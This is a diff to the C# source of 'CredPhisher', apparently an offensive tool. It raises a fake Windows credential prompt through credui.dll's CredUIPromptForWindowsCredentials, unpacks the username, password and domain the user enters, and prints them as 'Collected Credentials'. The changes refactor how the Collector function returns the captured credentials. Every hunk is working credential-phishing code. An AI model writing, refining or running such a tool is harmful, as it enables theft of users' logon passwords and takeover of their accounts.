@@ -20,6 +20,13 @@ namespace CredPhisher
             public IntPtr hbmBanner;
         }
 
+        public struct NetworkCredential
+        {
+            public string UserName;
+            public string Password;
+            public string Domain;
+        }
+
         [DllImport("credui.dll", CharSet = CharSet.Auto)]
         private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,
             IntPtr pAuthBuffer,
@@ -42,7 +49,7 @@ namespace CredPhisher
             ref bool fSave,
             int flags);
 
-        public static void Collector(string message, out NetworkCredential networkCredential)
+        public static NetworkCredential Collector(string message)
         {
             CREDUI_INFO credui = new CREDUI_INFO();
             //This block collects the current username and prompts them. This is easily modifiable.
@@ -54,6 +61,7 @@ namespace CredPhisher
             IntPtr outCredBuffer = new IntPtr();
             uint outCredSize;
             bool save = false;
+            NetworkCredential networkCredential;
             int result = CredUIPromptForWindowsCredentials(ref credui,
                 0,
                 ref authPackage,
@@ -83,10 +91,16 @@ namespace CredPhisher
                         Password = passwordBuf.ToString(),
                         Domain = domainBuf.ToString()
                     };
-                    return;
+                    return networkCredential;
                 }
             }
-            networkCredential = null;
+            networkCredential = new NetworkCredential()
+            {
+                UserName = "".ToString(),
+                Password = "".ToString(),
+                Domain = "".ToString()
+            };
+            return networkCredential;
         }
 
         static void Main(string[] args)
@@ -97,7 +111,8 @@ namespace CredPhisher
             }
             try
             {
-                Collector(args[0], out NetworkCredential networkCredential);
+                NetworkCredential networkCredential;
+                networkCredential= Collector(args[0]);
                 Console.WriteLine("[+] Collected Credentials:\r\n" +
                     "Username: " + networkCredential.Domain + "\\" + networkCredential.UserName + "\r\n" +
                     "Password: " + networkCredential.Password);
